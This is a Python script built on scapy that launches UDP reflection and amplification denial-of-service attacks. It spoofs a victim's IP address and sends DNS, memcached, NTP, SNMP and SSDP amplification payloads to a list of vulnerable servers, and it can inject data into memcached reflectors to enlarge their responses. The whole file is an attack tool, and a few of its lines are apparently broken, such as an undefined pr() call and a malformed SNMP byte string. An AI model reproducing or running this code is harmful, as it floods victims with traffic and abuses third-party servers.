#-- coding: utf8 --
#!/usr/bin/env python3


import sys, os
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

import code
# code.interact(local=dict(globals(), **locals()))


PORT = {
    'dns': 53,
    'memcached': 11211,
    'ntp': 123,
    'snmp': 161,
    'ssdp': 1900
}

PAYLOAD = {
	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
			'\x00\x00\x00\x00\x00\x00'),
    'memcached': ('\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'),
    'ntp': ('\x17\x00\x02\x2a\x00\x00\x00\x00'),
    'snmp': ('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
		     '\x69\x63\xa5\x19\x02\x04\x71\xb4\sxb5\x68\x02\x01'
		     '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
		     '\x01\x02\x01\x05\x00'),
    'ssdp': ('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
		     'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}


def send_payload(target, targetport, v_server, v_server_port, payload, count):
    send(IP(src=target, dst='%s' % v_server) / UDP(sport=int(targetport),dport=v_server_port)/Raw(load=payload), count=count)



@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

# vulnerable servers
with open('vuln.txt') as my_file:
    vulnerable_servers = [line.rstrip() for line in my_file]
pr()
print(vulnerable_servers)

# target server
with open('target.txt') as my_file:
    t = my_file.readline().rstrip().split(':')
target, targetport = t[0], t[1]

count = 10

# define payload
if sys.argv[1] == 'memcached':
    data = input("Memcached Payload: ") or None

    if data == None:
        payload = PAYLOAD[sys.argv[1]]

    else:
        # set data on remote memcached server
        # set key flags exptime bytes value
        setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
        # get key
        getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")

        payload = setdata
        for i in vulnerable_servers:
            send_payload(target, targetport, i, PORT[sys.argv[1]], payload, 1)
        payload = getdata
elif sys.argv[1] == 'dns':
    id = struct.pack('H', randint(0, 65535))
    payload = PAYLOAD[sys.argv[1]].format(id, "")

else:
    payload = PAYLOAD[sys.argv[1]]

# Attack
print(" ! LAUNCHING ATTACK !")
for i in vulnerable_servers:
    print(i)
    with suppress_stdout():
        send_payload(target, targetport, i, PORT[sys.argv[1]], payload, count)

print("DONE")
